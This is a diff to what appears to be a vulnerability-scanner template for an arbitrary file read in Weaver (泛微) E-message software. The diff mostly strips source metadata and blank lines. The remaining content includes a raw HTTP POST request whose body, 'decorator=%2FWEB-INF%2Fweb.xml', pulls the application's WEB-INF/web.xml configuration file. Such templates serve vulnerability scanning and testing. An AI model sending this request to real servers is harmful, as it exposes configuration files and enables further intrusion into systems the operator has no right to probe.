@@ -3,12 +3,8 @@ info:
   name: 泛微 E-message 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lmmuyyqlw986ro61'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lmmuyyqlw986ro61
-    fofa: 暂无
 http:
 - raw:
   - 'POST / HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     decorator=%2FWEB-INF%2Fweb.xml&confirm=true
